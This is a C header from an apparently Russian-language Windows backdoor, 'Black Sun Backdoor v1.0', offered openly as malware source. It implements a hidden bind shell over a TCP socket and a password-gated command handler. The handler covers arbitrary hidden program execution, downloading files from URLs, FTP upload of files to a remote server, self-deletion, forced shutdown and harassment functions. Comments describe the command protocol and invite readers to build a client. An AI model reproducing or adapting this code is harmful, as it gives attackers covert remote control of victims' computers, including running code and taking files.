/*
 *  ---------------------------------------------------------------------
 * 	       ____  _            _     _____             
 * 	      |  _ \| |          | |   / ____|            
 * 	      | |_) | | __ _  ___| | _| (___  _   _ _ __  
 * 	      |  _ <| |/ _` |/ __| |/ /\___ \| | | | '_ \ 
 * 	      | |_) | | (_| | (__|   < ____) | |_| | | | |
 * 	      |____/|_|\__,_|\___|_|\_\_____/ \__,_|_| |_|
 *                 Black Sun Backdoor v1.0 prebeta        
 *
 *                          (x) Cytech 2007
 *
 *  ---------------------------------------------------------------------
 *  [backdoor.h]
 *      Модуль состоящий из функций бэкдора (bindshell и своего сервера).
 *  ---------------------------------------------------------------------
 */
 
 // ------------------ [ отсылка данных клиенту ] ------------------ //
 
static DWORD WINAPI ClientSend(char *Data, SOCKET zsock)
{
    send(zsock, Data, lstrlen(Data),0);
    closesocket(zsock); 
	fZeroMemory (&Data, sizeof(Data));
    return 0; 
}

// ------------------ [ bindshell бэкдор ] ------------------ //

// эти две ф-ии я позаимствовал у el-//0x48k из el-small-backdoor. старый код закомментирован, 
// т.к он жутко глючный (работает но лучше это не юзать ))), а el как всегда отличился 
// стабильностью и граммотной реализацией: можно работать прямо через telnet (известно, что telnet
// посылает всего по одному байту (то есть символу) на сокет, бэкдор их "складывает" до переноса 
// строки и только потом выполняет, в моем же случае telnet не подходил воощбе,
// поэтому приходилось юзать тулзу netcat (win32/nix)). От себя добавил только получение пути до 
// коммандного интерпретатора через переменную среды "ComSpec".
//
// bindshell-backdoor ripped from el-small-backdoor by el- // 0x48k
// el-site.narod.ru || hellknights.void.ru

/*
================
MakeShell
================
*/
static DWORD WINAPI MakeShell( LPVOID lpParam )
{
	DWORD				dwLen;
	int					nTimeOut;
	int					iTemp;
	SOCKET				sock;
	HANDLE				cstdin;
	HANDLE				cstdout;
	HANDLE				rstdout;
	HANDLE				wstdin;
	unsigned long		lTotal;
	STARTUPINFO			si;
	SECURITY_ATTRIBUTES sa;
	PROCESS_INFORMATION pi;
	char				szTemp[ MAX_PATH ];
	static DWORD		dwTemp;
	char				cmd[256];

	sock = *( ( SOCKET * )lpParam );
	sa.lpSecurityDescriptor		= NULL;
	sa.nLength					= sizeof( SECURITY_ATTRIBUTES );
	sa.bInheritHandle			= TRUE;
	
	if (!CreatePipe(&cstdin, &wstdin, &sa, 0))
	{
		return 0;
	}
	
	if (!CreatePipe(&rstdout, &cstdout, &sa, 0))
	{
		return 0;
	}
	
	GetStartupInfo(&si);
	si.dwFlags		= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow	= SW_HIDE;
	si.hStdOutput	= cstdout;
	si.hStdError	= cstdout;
	si.hStdInput	= cstdin;

	GetEnvironmentVariable(COMSPEC, cmd, 256); 

	if ( !CreateProcess(0, cmd, 0, 0, TRUE, CREATE_NEW_CONSOLE, 0, 0, &si, &pi ))
	{
		return 0;
	}
	
	while(GetExitCodeProcess(pi.hProcess, &dwTemp) && (dwTemp == STILL_ACTIVE))
	{
		if (nTimeOut >= 10000)
		{
			break;
		} 
		if (PeekNamedPipe(rstdout, szTemp, 1, &dwTemp, &lTotal, 0) && dwTemp)
		{
			for (iTemp = 0; iTemp < lTotal; iTemp += MAX_PATH - 1)
			{
				fMemSet( szTemp, sizeof( szTemp ), 0x00 );
				ReadFile( rstdout, szTemp, MAX_PATH - 1, &dwTemp, 0 );
				send( sock, szTemp, dwTemp, 0 );
			}
		}
		if (!ioctlsocket(sock, FIONREAD , &dwTemp) && dwTemp)
		{
			nTimeOut = 0;
			fMemSet(szTemp, sizeof(szTemp), 0x00);
			dwLen = recv(sock, szTemp, 1, 0);
			if (dwLen <= 0)
			{
				break;
			}
			if (*szTemp == '\x0A')
			{
				WriteFile(wstdin, "\x0D", 1, &dwTemp, 0);
			} 
			WriteFile(wstdin, szTemp, 1, &dwTemp, 0);
		}
		nTimeOut ++;
		Sleep(1);
	}

	CloseHandle(cstdin);
	CloseHandle(wstdin);
	CloseHandle(cstdout);
	CloseHandle(rstdout);
	closesocket(sock );
	TerminateProcess(pi.hProcess, 0);
	ExitThread(0);

	return 0;
}


/*
================
InitShell 
================
*/
static DWORD WINAPI InitShell(short port)
{
	DWORD				dwThrId;
	static SOCKET		sock;
	static SOCKET		csock;
	struct sockaddr_in	sin;

 	sock = socket(AF_INET, SOCK_STREAM, 0);
		if (sock != INVALID_SOCKET)
		{
			sin.sin_family = AF_INET;
			sin.sin_port = htons(port);
			sin.sin_addr.S_un.S_addr = INADDR_ANY;
			fMemSet(&( sin.sin_zero ), 8, 0x00);
			if (bind(sock, (struct sockaddr*) &sin, sizeof(sin)) == 0)
			{
				if (listen(sock, 0x100) != SOCKET_ERROR)
				{
					while((csock = accept(sock, 0, 0)))
					{
						CreateThread(0, 0, MakeShell, (LPVOID)&csock, 0, &dwThrId);
					} 
				}
			}
			closesocket(sock);
		}
	return TRUE;
}

/*
 *  ------------
 *  old-code:
 *  ------------
 *  static DWORD WINAPI BackdoorBindCMD(short port)
 *  {
 *  	HANDLE Read1,Write1,Read2,Write2;
 *  	SOCKET servsock, clientsock;            
 *  	SECURITY_ATTRIBUTES secu = {
 *  								 (DWORD) sizeof (SECURITY_ATTRIBUTES), 
 *  								  NULL,
 *  								  TRUE 
 *  							   }; 
 *  	STARTUPINFO starti;              
 *  	PROCESS_INFORMATION pi;          
 *  	SOCKADDR_IN sin;                         
 *  	// WORD wVersionRequested = MAKEWORD (2,0); 
 *  	int count =0;
 *  
 *  	int err;
 *  	char buffer[1024], cmd[256],
 *  
 *  	lpNumberOfBytesRead = GetEnvironmentVariable("ComSpec", cmd, 256); 
 *  	
 *  	InitWinSock2API();
 *  	// err = WSAStartup(wVersionRequested, &wsadata); 
 *  
 *  		sin.sin_family = AF_INET; 
 *  		sin.sin_addr.s_addr=0;
 *  		sin.sin_port = htons(port); 
 *  		err = sizeof (sin);
 *  
 *  	servsock = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); 
 *  	bind (servsock, (struct sockaddr *)&sin, err);     
 *      listen (servsock, SOMAXCONN);  
 *  
 *  	clientsock = accept (servsock, (struct sockaddr *)&sin, &err); 
 *  
 *  	if (clientsock == INVALID_SOCKET)
 *  	{ 
 *  		ExitThread (0);
 *  	}
 *  
 *  	CreatePipe(&Read1,&Write1,&secu,0);  
 *  	CreatePipe(&Read2,&Write2,&secu,0);  
 *  
 *  	ZeroMemory (&starti,sizeof (starti));
 *  	ZeroMemory (&pi,sizeof (pi));
 *  
 *  	starti.cb=sizeof (STARTUPINFO);        
 *  	starti.dwFlags=STARTF_USESHOWWINDOW+STARTF_USESTDHANDLES;
 *  	starti.wShowWindow=SW_HIDE;   
 *  	starti.hStdInput=Read2;    
 *  	starti.hStdOutput=Write1;
 *  	starti.hStdError=Write1;
 *  	
 *  	err = CreateProcess(NULL,cmd,&secu,&secu,TRUE,0,NULL,NULL,&starti,&pi);
 *  
 *  	while (clientsock!=SOCKET_ERROR) 
 *  	{
 *   		 Sleep (100);
 *   		 ZeroMemory (buffer,1024);
 *    		 PeekNamedPipe(Read1,NULL,0,NULL,&lpNumberOfBytesRead,NULL); 
 *  	 
 *  		while (lpNumberOfBytesRead) 
 *  		{                      
 *  			Sleep (200);
 *  			err = ReadFile(Read1,buffer,1024,&lpNumberOfBytesRead,NULL);
 *  			if (!err) break;
 *  			else send (clientsock,buffer,lpNumberOfBytesRead,0);
 *  			PeekNamedPipe(Read1,NULL,0,NULL,&lpNumberOfBytesRead,NULL);
 *  		}
 *  			Sleep (200);
 *  			err = recv (clientsock,buffer,1024,0); 
 *  		if(clientsock == 0)
 *  		{
 *  			count++;
 *  			if (count >1)
 *  			break;
 *  		}
 *  								
 *  		if (!strstr (buffer,"exit")==0)
 *  		{ 
 *  			ExitProcess (0);
 *  			closesocket (servsock);
 *  			closesocket (clientsock);
 *  			break;
 *  			return 0; 
 *  		}
 *   		else
 *  			WriteFile(Write2,buffer,err,&lpNumberOfBytesRead,0);
 *  	}
 *      
 *  	TerminateProcess(pi.hProcess,0);
 *  	return 0; 
 *  }
 */

// ------------------ [ получние данных от клиента и их обработка ] ------------------ //

static DWORD WINAPI Backdoor_Recv(LPVOID lpParam)
{
    SOCKET  sock = (SOCKET)lpParam;
    char  recvbuffer[1024];
    int  ret, freq, times, rand1, rand2;
	HANDLE hSelfDeleteThread; 

			//---- [ получаем данные от клиента ] ----//
    while(1)
    {
	fZeroMemory (&recvbuffer, sizeof(recvbuffer));

       ret = recv(sock, recvbuffer, 1024, 0); 
       if (ret == SOCKET_ERROR) break;
	   else 
	   {
	     if(lstrlen(recvbuffer) > 0)
	     {
		 
	     // парсер команд по разделителю "ђ"  
	     // Вот формат команды:
	     // 
	     // [LOGIN:PASSWORD]ђ[COMMAND]ђ[ARGUMENT1]ђ[ARGUMENT2]ђ[ARGUMENT3]ђ.....
	     // 
	     // Как видно разделителем команд является символ ђ.
	     // там же вы можете изменить разделитель команд, если это необходимо (не забудьте тогда и в admin.php)
	     // 	[LOGIN:PASSWORD] 	-- 	логин:пароль (например, cytech:cytech, указываются в conf.h (AUTH))
	     // 	[COMMAND]        	-- 	команда (например, bindshell)
	     // 	[ARGUMENT1]      	-- 	1ый аргумент команды (в случае с binshell, например, 31337)
	     // К примеру, команда bindshell 31337 выглядит при отправке так (логин и пароль - cytech;cytech):
	     //		cytech:cytechђbindshellђ31337
		 // Можете смело писать клиент :)

			char * array[1024]; 
			char * t = strtok(recvbuffer,"ђ");
			int i; int portint; 
			for(i = 0; t; t = strtok(NULL,"ђ"), i++){ array[i] = t; } 
			
		if (lstrcmp(array[0], AUTH)==0)
        {

			   //---------------------- [ команда: messagebox ] -----------------//
               if (lstrcmp(array[1], "msgbox")==0) 
               { 
                        char * msg = array[2];
                        char * title = array[3];						
                        MessageBox(0,msg,title,0);
                        ClientSend(MSG_MSGBOX, sock);
               } 
			   //---------------------- [ команда: about ] -----------------//
			   else if(lstrcmp(array[1], "version")==0)
			   {
                    ClientSend(VERSION, sock); 
			   }
			   //---------------------- [ команда: execute command ] -----------------//
			   else if (lstrcmp(array[1], "cmd")==0)
			   { 
					char * cmdres = ExecuteCMD(array[2]);
					ClientSend(cmdres, sock);
			   } 
			   //-----------------------[ команда: bindshell?port ]----------------------//
			   else if (lstrcmp(array[1], "bindshell")==0)
			   {
					StartThread(InitShell, (short)atoi(array[2]));				
					ClientSend(MSG_BINDSH, sock);
			   }
			   //---------------------- [ команда: exitprocess ] -----------------//
			   else if(lstrcmp(array[1], "exitprocess")==0)
			   {
					ClientSend(MSG_EXITPROC, sock);
					ExitProcess(0); 
			   }
			   //---------------------- [ команда: killmyself ] -----------------//
			   else if(lstrcmp(array[1], "killmyself")==0) 
			   {
				if(lstrcmp(array[2], AUTH)==0)
				{
					ClientSend(MSG_KILLSELF, sock);
					AddSelfToRun("killmyself");
					hSelfDeleteThread = StartThread(DeleteSelfFirstTime, "delself");
					ExitProcess(0); 
				} else { ClientSend(MSG_AUTHFAILED, sock); }
			   }
			   //---------------------- [ команда: download ] -----------------//
			   else if (lstrcmp(array[1], "download")==0)
               {
					__try
					{
						HRESULT hUdtf = URLDownloadToFile(NULL, array[2], array[3], 0, NULL); 
						if(hUdtf == S_OK)
						{
							ClientSend(MSG_LOADER_OK, sock);
						} 
						else ClientSend(MSG_LOADER_ERROR, sock);
					} 
					__except(EXCEPTION_EXECUTE_HANDLER)
					{
						ClientSend(MSG_LOADER_SEH, sock); 
					}
               }
			   //---------------------- [ команда: exec?hide/show ] -----------------//
			   else if (lstrcmp(array[1], "exec")==0)
               {
					if(lstrcmp(array[2], "hide")==0)
					{
					  if(WinExec(array[3], SW_HIDE) > 32)
					  {
					    ClientSend(MSG_EXECHIDE, sock);
					  }
					  else ClientSend(MSG_EXECERROR, sock);
					}
					else if(lstrcmp(array[2], "show")==0)
					{
						if(WinExec(array[3], SW_SHOW) > 32)
						{
							ClientSend(MSG_EXECSHOW, sock);
						} else ClientSend(MSG_EXECERROR, sock);
					}
              }
			  //---------------------- [ команда: ftp_upload ] -----------------//
              else if (lstrcmp(array[1], "ftp_upload")==0)
              {
					HINTERNET inet, inet2;
					BOOL connected;
					inet = InternetOpen(FTP_UPLOAD_CLIENT, INTERNET_OPEN_TYPE_DIRECT, "", "", 0); 
					portint = atoi(array[3]);
					inet2 = InternetConnect(inet,array[2],(short)portint,array[4],array[5],INTERNET_SERVICE_FTP, 0,0);
					
					if(inet2)
					{ 
						connected = TRUE; 
					} 
					else ClientSend(MSG_CONNECTERROR, sock);
					
					if(connected)
					{
						FtpPutFile(inet2, array[6],array[7], 0,0);
						ClientSend(MSG_FTPUPLOAD, sock);
					}

              } 
			 //---------------------- [  команда: power?logoff/shutdown/reboot/sleep/stand ] -----------------//
			 else if (lstrcmp(array[1], "power") == 0)
			 {
			   if (SetPrivilege("SeShutdownPrivilege", TRUE)) 
			   {
		 
			      if (lstrcmp(array[2], "logoff")==0)
				  { 
					ExitWindowsEx(EWX_LOGOFF,0); 
					ClientSend(MSG_LOGOFF, sock);
				  } 
				  else if (lstrcmp(array[2], "shutdown")==0) 
				  { 
					ExitWindowsEx(EWX_SHUTDOWN,0); 
					ClientSend(MSG_SHUTDOWN, sock);
				  }
				  else if (lstrcmp(array[2], "reboot")==0)
				  { 
					ExitWindowsEx(EWX_REBOOT,0);
					ClientSend(MSG_REBOOT, sock);
				  }
				  else if (lstrcmp(array[2], "stand")==0) 
				  {
				    SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_SCREENSAVE,1);
				    ClientSend(MSG_STAND, sock);
				  }
				  else if (lstrcmp(array[2], "sleep")==0) 
				  {
				    SetSystemPowerState(TRUE, TRUE);
				    ClientSend(MSG_SLEEP, sock);
				  } else {
							ClientSend(MSG_UNKNOWNARG, sock);
						 }
						 
				} else  { 
							ClientSend(MSG_SHUTDOWNPRIV, sock); 
						}
			 }

			  //---------------------- [ команда: cdrom?open/close ] -----------------//
			  else if (lstrcmp(array[1], "cdrom")==0)
              {
						if(lstrcmp(array[2], "open")==0)
						{
							mciSendString("Set cdaudio door open wait", NULL, 0, NULL);
							ClientSend(MSG_CDROMOPENED, sock);
						}
						else if(lstrcmp(array[2], "close")==0)
						{
							mciSendString("Set cdaudio door closed wait", NULL, 0, NULL);
							ClientSend(MSG_CDROMCLOSED, sock);
						} 
						else ClientSend(MSG_UNKNOWNARG, sock); 
			  }
			  //---------------------- [ команда: mouse?swap/unswap ] -----------------//
			  else if (lstrcmp(array[1], "mouse")==0)
              {
						if(lstrcmp(array[2], "swap")==0)
						{
							SwapMouseButton(TRUE);
							ClientSend(MSG_SWAPMOUSE, sock);
						}
						else if(lstrcmp(array[2], "unswap")==0)
						{
							SwapMouseButton(FALSE);
							ClientSend(MSG_UNSWAPMOUSE, sock);
						} 
						else 
						{ 
							ClientSend(MSG_UNKNOWNARG, sock); 
						}
			  }
			  //---------------------- [ команда: set_wall_bmp ] -----------------//
			  else if (lstrcmp(array[1], "set_wall_bmp")==0)
              {
						char * PicName = array[2];
						SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, PicName, SPIF_SENDCHANGE);
						ClientSend(MSG_WALLPSET, sock); 
              }
			  //---------------------- [ команда: monitor?on/off ] -----------------//
			  else if (lstrcmp(array[1], "monitor")==0)
              {
						if(lstrcmp(array[2], "on")==0)
						{
							SendMessage(HWND_BROADCAST,WM_SYSCOMMAND,SC_MONITORPOWER,-1);
							ClientSend(MSG_MONON, sock);
						}
						else if(lstrcmp(array[2], "off")==0)
						{
							SendMessage(HWND_BROADCAST,WM_SYSCOMMAND,SC_MONITORPOWER, 2); 
							ClientSend(MSG_MONOFF, sock);
						} 
						else ClientSend(MSG_UNKNOWNARG, sock); 
			  }
			  //---------------------- [ команда: crazy_mouse ] -----------------//
			  else if (lstrcmp(array[1], "crazy_mouse")==0)
			  {
		            freq = atoi(array[2]);
					times = atoi(array[3]);
					for (i = 0; i < times; i++)
					{
						SYSTEMTIME time; GetSystemTime(&time);
						srand(time.wSecond);
						rand1 = ((rand() % 1024) + 1);
						rand2 = ((rand() % 1024) + 1);
						SetCursorPos(rand1,rand2);
						Sleep(freq);
						ClientSend(MSG_DONE, sock);
					}
				}
			  //---------------------- [ команда: keyboard ] -----------------//
			  else if (lstrcmp(array[1], "keyboard")==0) 
			  {
					if (lstrcmp(array[2], "numlock_on")==0)  
					{
						keybd_event(VK_NUMLOCK,0,0,0); keybd_event(VK_NUMLOCK,0,KEYEVENTF_KEYUP,0); 
						ClientSend(MSG_DONE, sock); 
					}
					else if (lstrcmp(array[2], "numlock_off")==0)
					{ 
						keybd_event(VK_NUMLOCK,0,0,1); 
						keybd_event(VK_NUMLOCK,0,KEYEVENTF_KEYUP,0); 
						ClientSend(MSG_DONE, sock); 
					}
					else if (lstrcmp(array[2], "capslock_on")==0) 
					{
						keybd_event(VK_CAPITAL,0,0,0);
						keybd_event(VK_CAPITAL,0,KEYEVENTF_KEYUP,0); 
						ClientSend(MSG_DONE, sock); 
					}
					else if (lstrcmp(array[2], "capslock_off")==0) 
					{
						keybd_event(VK_CAPITAL,0,0,1);
						keybd_event(VK_CAPITAL,0,KEYEVENTF_KEYUP,0);
						ClientSend(MSG_DONE, sock); 
					}
					else if (lstrcmp(array[2], "scrolllock_on")==0)
					{
						keybd_event(VK_SCROLL,0,0,0); 
						keybd_event(VK_SCROLL,0,KEYEVENTF_KEYUP,0); 
						ClientSend(MSG_DONE, sock); 
					}
					else if (lstrcmp(array[2], "scrolllock_off")==0) 
					{
						keybd_event(VK_SCROLL,0,0,1); 
						keybd_event(VK_SCROLL,0,KEYEVENTF_KEYUP,0);
						ClientSend(MSG_DONE, sock); 
					} else {
							ClientSend(MSG_UNKNOWNARG, sock); 
						   }
			  }
			 //---------------------- [ команда: funwindows ] -----------------//
			 else if (lstrcmp(array[1], "funwindows") == 0)
			 {
			 	HWND   	 hWndc1, 	hWndc2, 	hWndc3,	 	hWndc4,
						 hWndc5,	hWndc6, 	hWndc7, 	hWndc8, 	hWndc9;
				// ужас :D
			     hWndc1 = FindWindow("Shell_TrayWnd", NULL);
				 hWndc2 = FindWindowEx(hWndc1, NULL, "Button", "start");
				 hWndc3 = FindWindowEx(hWndc2, NULL, "ReBarWindow32", NULL);
				 hWndc4 = FindWindowEx(hWndc3, NULL, "ToolbarWindow32", "Quick Launch");
				 hWndc5 = FindWindowEx(hWndc3, NULL, "MSTaskSwWClass", NULL);
				 hWndc6 = FindWindowEx(hWndc1, NULL, "TrayNotifyWnd", NULL);
				 hWndc7 = FindWindowEx(hWndc6, NULL, "Button", NULL);
				 hWndc8 = FindWindowEx(hWndc6, NULL, "SysPager", NULL);
				 hWndc9 = FindWindowEx(hWndc6, NULL, "TrayClockWClass", NULL);

				if (strcmp(array[2], "hide_panel")==0) 
				{ SetWindowStatus(hWndc1, "hide"); ClientSend(MSG_DONE, sock); }
				else if (lstrcmp(array[2], "show_panel")==0) 
				{ SetWindowStatus(hWndc1, "show"); ClientSend(MSG_DONE, sock); }
				else if (lstrcmp(array[2], "hide_start")==0) 
				{ SetWindowStatus(hWndc2, "hide"); ClientSend(MSG_DONE, sock); }
				else if (lstrcmp(array[2], "show_start")==0)
				{ SetWindowStatus(hWndc2, "show"); ClientSend(MSG_DONE, sock); }
				else if (lstrcmp(array[2], "hide_rebar")==0) 
				{SetWindowStatus(hWndc3, "hide"); ClientSend(MSG_DONE, sock); }
				else if (lstrcmp(array[2], "show_rebar")==0) 
				{ SetWindowStatus(hWndc3, "show"); ClientSend(MSG_DONE, sock); }
				else if (lstrcmp(array[2], "hide_quicklaunch")==0) 
				{ SetWindowStatus(hWndc4, "hide"); ClientSend(MSG_DONE, sock); }
				else if (lstrcmp(array[2], "show_quicklaunch")==0) 
				{ SetWindowStatus(hWndc4, "show"); ClientSend(MSG_DONE, sock); }
				else if (lstrcmp(array[2], "hide_tasksw")==0) 
				{ SetWindowStatus(hWndc5, "hide"); ClientSend(MSG_DONE, sock); }
				else if (lstrcmp(array[2], "show_tasksw")==0) 
				{ SetWindowStatus(hWndc5, "show"); ClientSend(MSG_DONE, sock); }
				else if (lstrcmp(array[2], "hide_trey")==0) 
				{ SetWindowStatus(hWndc6, "hide"); ClientSend(MSG_DONE, sock); }
				else if (lstrcmp(array[2], "show_trey")==0) 
				{ SetWindowStatus(hWndc6, "show"); ClientSend(MSG_DONE, sock); }
				else if (lstrcmp(array[2], "hide_treybutton")==0) 
				{ SetWindowStatus(hWndc7, "hide"); ClientSend(MSG_DONE, sock); }
				else if (lstrcmp(array[2], "show_treybutton")==0)
				{ SetWindowStatus(hWndc7, "hide"); ClientSend(MSG_DONE, sock); }
				else if (lstrcmp(array[2], "hide_treyicon")==0) 
				{ SetWindowStatus(hWndc8, "hide"); ClientSend(MSG_DONE, sock); }
				else if (lstrcmp(array[2], "show_treyicon")==0)
				{ SetWindowStatus(hWndc8, "show"); ClientSend(MSG_DONE, sock); }
				else if (lstrcmp(array[2], "hide_time")==0) 
				{ SetWindowStatus(hWndc9, "hide"); ClientSend(MSG_DONE, sock); }
				else if (lstrcmp(array[2], "show_time")==0) 
				{ SetWindowStatus(hWndc9, "show"); ClientSend(MSG_DONE, sock); }  
				else 	{ 	ClientSend(MSG_UNKNOWNARG, sock); 	}
			 }
			 /* [ здесь может быть ваша новая команда, пример: ]
			  *
			  * else if (lstrcmp(array[1], "command_rtfm") == 0)
			 * {
			  *   MessageBox(0, array[2], "в array[2] хранится 1ый аргумент команды", 0);
			  *	  ClientSend("\n текст отсылаемый клиенту \n", sock);
			  * }
			  * отрправив команда command_rtfmђcytech
			  * вылезит соответствующий messagebox.
			  */
			 
		     //---------------------- [ команда не поддерживается ] -----------------//
				else { 
							ClientSend(MSG_UNKNOWNCMD, sock); 
					 }  
		     //------------------ [ в авторизации отказано ] ----------------//
		   } else { 
						ClientSend(MSG_AUTHFAILED, sock); 
				  }  
		  } 
	  fZeroMemory (&recvbuffer, sizeof(recvbuffer));

	  }
	}
    return 0;
}

// ------------------ [ слушаем порт и подключаем клиента ] ------------------ //

static DWORD WINAPI Backdoor_Listen(short port)
{
      SOCKET server, client;
      SOCKADDR_IN localaddr, clientaddr; 
      HANDLE hThread; 
      int clientSize;
      clientSize = sizeof(clientaddr); 
	  
      // создаем сокет, заполняем структуру, ставим на прослушку. как обычно )
      server = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
	  
      localaddr.sin_addr.s_addr = htonl(INADDR_ANY);
      localaddr.sin_family = AF_INET;
      localaddr.sin_port = htons(port); 
	  
      bind(server, (struct sockaddr *)&localaddr, sizeof(localaddr));
      listen(server, SOMAXCONN); 


	   while(1) 
	   {
	        // если клиент подключился, то создаем поток "передачи управления" ф-ии Backdoor_Recv 
			// (получение данных от клиента и их обработка, а также овтет на них)
			
		    client = accept(server, (struct sockaddr *)&clientaddr, &clientSize);
            hThread = StartThread(Backdoor_Recv,(LPVOID)client); 
		    CloseHandle(hThread);
       } 

 	   closesocket(server);

  return 0;
}